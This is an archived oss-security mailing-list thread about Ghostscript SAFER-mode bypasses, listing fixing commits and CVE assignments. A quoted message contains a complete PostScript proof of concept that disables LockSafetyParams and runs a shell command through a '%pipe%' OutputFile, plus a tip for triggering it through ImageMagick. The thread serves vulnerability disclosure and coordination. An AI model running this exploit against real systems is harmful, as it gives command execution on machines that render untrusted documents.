X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["9354" "Tuesday" "4" "September" "2018" "11:47:58" "-0700" "Tavis Ormandy" "taviso@google.com" "<CAJ_zFkLOkSWe8x5N9Mf9bx1J9+oLnzNtHzTfEDXg0JGPj7N7DA@mail.gmail.com>" "278" "Re: [oss-security] Re: More Ghostscript Issues: Should we disable PS coders in policy.xml by default?" "^Date:" nil nil "9" "2018090418:47:58" "[oss-security] Re: More Ghostscript Issues: Should we disable PS coders in policy.xml by default?" (number mark "        taviso@googl Sep  4  278/9354  " thread-indent "\"Re: [oss-security] Re: More Ghostscript Issues: Should we disable PS coders in policy.xml by default?\"\n") "<20180903105747.dihmczuqhl4kcnx5@suse.de>" ("<CAOVKCF0Qehz2q3m2vPSAr3vKRAxdHrTbnyk71ApFYnVXuZ-P6Q@mail.gmail.com>" "<alpine.GSO.2.20.1808221612460.22335@scrappy.simplesystems.org>" "<5b7dd771.1c69fb81.a6d8.6521@mx.google.com>" "<alpine.GSO.2.20.1808230753470.3841@freddy.simplesystems.org>" "<5b7eb7b2.1c69fb81.6b98e.519f@mx.google.com>" "<alpine.GSO.2.20.1808230958120.3639@scrappy.simplesystems.org>" "<CAJ_zFk+yb9zEXSqs2fdANvKkipg2yQAU89xKr1HMv-EJG2-vxg@mail.gmail.com>" "<20180828092517.eteuy4vzcpdpr62p@suse.de>" "<CAJ_zFk+dpXH453R0Hy5iHzYO2DkZjrBK3Sqh00Aie1z4=VDQOQ@mail.gmail.com>" "<CAJ_zFkLXTpjCijqNsHs0ZR4NdVwM+16ojUmxjYu0aZAgW=QhKQ@mail.gmail.com>" "<20180903105747.dihmczuqhl4kcnx5@suse.de>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 16026 invoked by uid 550); 4 Sep 2018 18:48:24 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 16007 invoked from network); 4 Sep 2018 18:48:23 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=google.com; s=20161025;
        h=mime-version:references:in-reply-to:from:date:message-id:subject:to;
        bh=XZ1berGf3na6vAejhBr8t/RCo/NoGOYDWFtlGk1suxU=;
        b=NtihN4j+UWSIAYcBwk1twSnPZWT5nP9wAOeZFrljJmO3EPE2jUL6Z1YAQAr2GoHrxU
         4w2KkyNeu4g4SB+Id/cJXUrP/+quACpylQGk0VKqi+ZhF3r1a82VrjibP87TrjEkGcPV
         I8Z7DeRUW0qHHjqvNbqKZeHuwNxWOIzP+M2jMLS6jwcm5ZB4sgCNuzv5z12JyOBmT6SB
         o+TwjiGgeOJv+T0SjMUVd8vvMRISdorA+6cQLtts+0HMH3F4tmBnAsgUEkJM3Vx0i8o6
         neNp8TKhXEfw1pSlCz8eaqlrl2ny5DJeKr26Cdw0sDMuZH7AmBo+8YnaCgNsHBFn7oe4
         FQEA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:mime-version:references:in-reply-to:from:date
         :message-id:subject:to;
        bh=XZ1berGf3na6vAejhBr8t/RCo/NoGOYDWFtlGk1suxU=;
        b=I6S8joFZpVntqBJpmXwxTyqsLUU5kTuu80UM0NgKewbGrqb50ukf4gHi0voT4uh2/3
         D6JWlsGWDwvqGlSu+P2jLW955/6B3rX2Ks6TjfRkT6emAZ6+xmxq2Jl0UhttaYwjd1u8
         DBgR5n6CbNWTnkA2eDrGj7BAZ6NYiKpxOArWGHy524DpXEopH0WvfTqQirsJ5oB3J+DT
         3iwhi6lKqqn9EBooNPkwFYTpGduTD/oCqB8mPA0x1+DVAEoKRYCxn0S/iCDKzkQiKWU5
         9fTKlZEttzuPMPVSFkHXppclvfCMsa9q35tM7UarFZlULu8XWHc/PVndPzYKppdA8gOs
         ECJQ==
X-Gm-Message-State: APzg51DDx6EW51gJ8OzWJd1w3+TFxsWDQMHodCojITxx9xTjS7DkqozM
	ZzccoQtyogcMnFpb7T13UrWQTrVtnDLq09nhjHdLHxOL
X-Google-Smtp-Source: ANB0Vda+W9BJfoWRp+pn+Bv/RGsuhBzQyEczYQu57YEJhjw2E59x6D2YFBwtFVpZQgLoNDoGnLxJZ0fGW9s98wemhVA=
X-Received: by 2002:ac8:76c4:: with SMTP id q4-v6mr31297560qtr.95.1536086890304;
 Tue, 04 Sep 2018 11:48:10 -0700 (PDT)
MIME-Version: 1.0
References: <CAOVKCF0Qehz2q3m2vPSAr3vKRAxdHrTbnyk71ApFYnVXuZ-P6Q@mail.gmail.com>
 <alpine.GSO.2.20.1808221612460.22335@scrappy.simplesystems.org>
 <5b7dd771.1c69fb81.a6d8.6521@mx.google.com> <alpine.GSO.2.20.1808230753470.3841@freddy.simplesystems.org>
 <5b7eb7b2.1c69fb81.6b98e.519f@mx.google.com> <alpine.GSO.2.20.1808230958120.3639@scrappy.simplesystems.org>
 <CAJ_zFk+yb9zEXSqs2fdANvKkipg2yQAU89xKr1HMv-EJG2-vxg@mail.gmail.com>
 <20180828092517.eteuy4vzcpdpr62p@suse.de> <CAJ_zFk+dpXH453R0Hy5iHzYO2DkZjrBK3Sqh00Aie1z4=VDQOQ@mail.gmail.com>
 <CAJ_zFkLXTpjCijqNsHs0ZR4NdVwM+16ojUmxjYu0aZAgW=QhKQ@mail.gmail.com> <20180903105747.dihmczuqhl4kcnx5@suse.de>
In-Reply-To: <20180903105747.dihmczuqhl4kcnx5@suse.de>
Message-ID: <CAJ_zFkLOkSWe8x5N9Mf9bx1J9+oLnzNtHzTfEDXg0JGPj7N7DA@mail.gmail.com>
Content-Type: multipart/alternative; boundary="0000000000007198c3057510193f"
Date: Tue, 4 Sep 2018 11:47:58 -0700
From: Tavis Ormandy <taviso@google.com>
Reply-To: oss-security@lists.openwall.com
Subject: Re: [oss-security] Re: More Ghostscript Issues: Should we disable PS
 coders in policy.xml by default?
To: oss-security@lists.openwall.com

--0000000000007198c3057510193f
Content-Type: text/plain; charset="UTF-8"

Thanks Marcus. FWIW, over the weekend upstream fixed all of the bugs I had
opened. Just looking this morning and I can see one or two of the fixes
were incomplete, I'll file new bugs and hopefully new fixes make it into
9.24 release.

(I'm only fuzzing with sort -R < postscript_commands.txt | gs -dSAFER, so
totally possible we'll have to do this again soon)

Tavis.

(p.s. I'm not exaggerating about the sort -R, that's literally how I'm
fuzzing it)

On Mon, Sep 3, 2018 at 3:59 AM Marcus Meissner <meissner@suse.de> wrote:

> Hi,
>
> I am still holding back CVE requesting as CERT promised to do this.
>
> If they do not reply with a plan until tomorrow I will proceed with
> requesting.
>
> Ciao, Marcus
> On Wed, Aug 29, 2018 at 01:43:22PM -0700, Tavis Ormandy wrote:
> > I should note, just add `userdict /setpagedevice undef` at the top if you
> > want to test it with ImageMagick.
> >
> > Tavis.
> >
> > On Wed, Aug 29, 2018 at 1:14 PM Tavis Ormandy <taviso@google.com> wrote:
> >
> > > Thanks Marcus, here are some more necessary commits:
> > >
> > >
> > >
> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=520bb0ea7519aa3e79db78aaf0589dae02103764
> > > # 699654 D /invalidaccess checks stop working after a failed restore
> > >
> > >
> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=5b5536fa88a9e885032bc0df3852c3439399a5c0
> > > # 699670 gssetresolution memory corruption
> > >
> > >
> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=ea735ba37dc0fd5f5622d031830b9a559dec1cc9
> > > # 699671 handling /undefined results in SEGV
> > >
> > >
> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=ea735ba37dc0fd5f5622d031830b9a559dec1cc9
> > > # 699676 PDF interpreter can leave dangerous operators available
> > >
> > > Please note that not all issues are resolved, and I have exploits that
> > > still work against HEAD.
> > >
> > > For example, this will still work if you pull master as of this
> writing:
> > >
> > > $ cat testcase.pdf
> > > %!PS
> > > % This is ghostscript bug #699687 (split out from bug #699654)
> > >
> > > a0 % just select a papersize to initialize page device
> > >
> > > % You can't def HWResolution (for example), because currentpagedevice
> is
> > > readonly:
> > > %
> > > % GS>currentpagedevice wcheck ==
> > > % false
> > > %
> > > % But you can just put or astore into it, because the array itself is
> > > writable:
> > > % GS>currentpagedevice /HWResolution get wcheck ==
> > > % true
> > > %
> > > % If you put some junk in there, then grestore stops working.
> > > currentpagedevice /HWResolution get 0 (foobar) put
> > >
> > > % this grestore will fail, `stopped` just handles the error instead of
> > > aborting.
> > > { grestore } stopped {} if
> > >
> > > % now LockSafetyParams will be incorrectly unset, you can check like
> this:
> > > % GS>mark currentdevice getdeviceprops .dicttomark /.LockSafetyParams
> get
> > > == pop
> > > % false
> > >
> > > % we can change and configure devices now, so make sure we're using one
> > > with
> > > % a OutputFile property.
> > > (ppmraw) selectdevice
> > >
> > > % run a shell command
> > > mark /OutputFile (%pipe%id) currentdevice putdeviceprops
> > > showpage
> > > $ evince testcase.pdf
> > > uid=1000(taviso) gid=1000(taviso) groups=1000(taviso),10(wheel)
> > > context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
> > > (libspectre) ghostscript reports: ioerror -12
> > >
> > > Tavis.
> > >
> > > On Tue, Aug 28, 2018 at 2:26 AM Marcus Meissner <meissner@suse.de>
> wrote:
> > >
> > >> Hi,
> > >>
> > >> I had 4 CVEs assigned yesterday afternoon already working from CERTs
> list,
> > >> see inline comments below. Please adjust if something is incorrect in
> > >> them.
> > >>
> > >> CERT has mailed overnight that they will take care of the CVE
> assignment,
> > >> so
> > >> I am defering the rest to them.
> > >>
> > >> Ciao, Marcus
> > >>
> > >> On Mon, Aug 27, 2018 at 04:02:46PM -0700, Tavis Ormandy wrote:
> > >> > Here is an update, Artifex made a press release
> > >> > <
> > >>
> https://www.darkreading.com/prnewswire2.asp?rkey=20180824UN89145&filter=3930
> > >> >
> > >> > listing
> > >> > some necessary commits, but the list was incomplete.
> > >> >
> > >> > Here is a list of relevant commits I'm aware of so far, some issues
> are
> > >> > still open with working exploits available. It's my understanding
> that
> > >> no
> > >> > new release is planned until late September, and vendors need to
> either
> > >> > ship a git snapshot when all issues are resolved, or apply patches.
> I
> > >> have
> > >> > testcases for each problem, but I think the bugs will be visible
> > >> eventually
> > >> > so I'm not posting them here.
> > >> >
> > >> >
> > >>
> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=ea735ba37dc0fd5f5622d031830b9a559dec1cc9
> > >> > # 699671
> > >> > handling /undefined results in SEGV
> > >> >
> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=0edd3d6c63
> > >> > # 699659 missing type check in ztype
> > >> >
> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=78911a01b6 #
> > >> > 699654 A /invalidaccess checks stop working after a failed restore
> > >> >
> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=5516c614dc33
> > >> #
> > >> > 699654 B /invalidaccess checks stop working after a failed restore
> > >> >
> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=79cccf641486
> > >> #
> > >> > 699654 C /invalidaccess checks stop working after a failed restore
> > >> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=b326a716
> #
> > >> 699655
> > >> > - missing type checking in setcolor
> > >> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=c3476dde
> #
> > >> 699656
> > >>
> > >>
> > >> > - LockDistillerParams boolean missing type checks
> > >> >
> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=a054156d42
> > >>         CVE-2018-15910
> > >>
> > >>
> > >> > # 699658 - Bypassing PermitFileReading by handling undefinedfilename
> > >> errors
> > >>
> > >>
> > >> >
> > >>
> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=0b6cd1918e1ec4ffd087400a754a845180a4522b
> > >> > # 699660 - shading_param incomplete type checking
> > >> >
> > >>
> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=e01e77a36cbb2e0277bc3a63852244bec41be0f6
> > >> > # 699660 - shading_param incomplete type checking
> > >>         CVE-2018-15909
> > >>
> > >>
> > >> >
> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=c432131c3f
> > >> > # 699661 - pdf14 garbage collection memory corruption
> > >> >
> > >>
> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=971472c83a345a16dac9f90f91258bb22dd77f22
> > >> > # 699663 - .setdistillerkeys memory corruption
> > >> >
> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=241d911127
> > >> > # 699664 - corrupt device object after error in job
> > >>
> > >>
> > >> >
> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=0d3901189f
> > >> > # 699657 - .tempfile SAFER restrictions seem to be broken
> > >>         CVE-2018-15908
> > >>
> > >> >
> > >>
> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=8e9ce5016db968b40e4ec255a3005f2786cce45f
> > >>
> > >>
> > >> > # 699665 - memory corruption in aesdecode
> > >> >
> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=b575e1ec42
> > >>
> > >>         CVE-2018-15911
> > >>
> > >> > # 699668 - .definemodifiedfont memory corruption if /typecheck is
> > >> handled
> > >> >
> > >> > Tavis
> > >> >
> > >> > On Thu, Aug 23, 2018 at 8:05 AM Bob Friesenhahn <
> > >> > bfriesen@simple.dallas.tx.us> wrote:
> > >> >
> > >> > > On Thu, 23 Aug 2018, Leonardo Taccari wrote:
> > >> > > >
> > >> > > > (Regarding the `file.ps2' and `file.ps3' examples without
> `PS2:' or
> > >> > > > `PS3:' prefixes according `convert -debug Policy -log "%e"' it
> seems
> > >> > > > that they ends up as:
> > >> > > >
> > >> > > > Domain: Coder; rights=Read; pattern="PS" ...
> > >> > > >
> > >> > > > ...so should be blocked by the workaround described in
> > >> > > > VU#332928. But please correct me if I'm wrong.)
> > >> > >
> > >> > > This is likely due to header magic detection (e.g.
> "%!PS-Adobe").  It
> > >> > > is possible that a different path will be taken if the common
> > >> > > Postscript header is not detected.  The file extension may then be
> > >> > > used as a hint.  Also, there are a wide varieties of ImageMagick
> > >> > > versions in use, with a wide variety of behaviors.
> > >> > >
> > >> > > The version of ImageMagick provided by the Ubuntu Linux I am
> using at
> > >> > > this moment dates from 2012!
> > >> > >
> > >> > > Bob
> > >> > > --
> > >> > > Bob Friesenhahn
> > >> > > bfriesen@simple.dallas.tx.us,
> > >> http://www.simplesystems.org/users/bfriesen/
> > >> > > GraphicsMagick Maintainer,    http://www.GraphicsMagick.org/
> > >> > >
> > >>
> > >> --
> > >> Marcus Meissner,SUSE LINUX GmbH; Maxfeldstrasse 5; D-90409 Nuernberg;
> Zi.
> > >> 3.1-33,+49-911-740 53-432,,serv=loki,mail=wotan,type=real <
> > >> meissner@suse.de>
> > >>
> > >
>
> --
> Marcus Meissner,SUSE LINUX GmbH; Maxfeldstrasse 5; D-90409 Nuernberg; Zi.
> 3.1-33,+49-911-740 53-432,,serv=loki,mail=wotan,type=real <
> meissner@suse.de>
>

--0000000000007198c3057510193f--
